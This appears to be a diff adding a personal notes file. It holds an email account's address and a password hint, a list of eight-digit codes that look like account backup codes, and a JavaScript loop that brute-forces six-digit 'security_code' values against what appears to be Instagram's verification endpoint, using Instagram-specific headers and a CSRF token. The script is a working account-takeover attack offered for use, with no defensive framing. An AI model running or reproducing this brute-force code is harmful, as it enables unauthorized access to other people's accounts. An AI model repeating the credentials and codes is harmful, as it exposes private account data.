@@ -1,0 +1,38 @@
+Open email at https://yandex.com
+
+NEXMO
+email:      ido.a@next2cloud.info
+password:   only name and date
+
+9216 8345
+3721 6584
+1725 6398
+5618 9403
+7104 8329
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+for (j=0; j < 900; j++){
+for (i = 100000+(1000*j); i < 101000+(1000*j); i++) {
+var http = new XMLHttpRequest();
+
+var url = '';
+
+var params = 'security_code=' + i;
+
+http.open('POST', url, true);
+
+
+
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+
+http.setRequestHeader('x-csrftoken', 'WE548s9YBqvIKg5mMZNG3acA4JdfN3Nd');
+
+http.setRequestHeader('x-instagram-ajax', '6dd8258a1c04');
+
+http.setRequestHeader('x-requested-with', 'XMLHttpRequest');
+
+http.send(params); }
+await sleep(5000);
+}
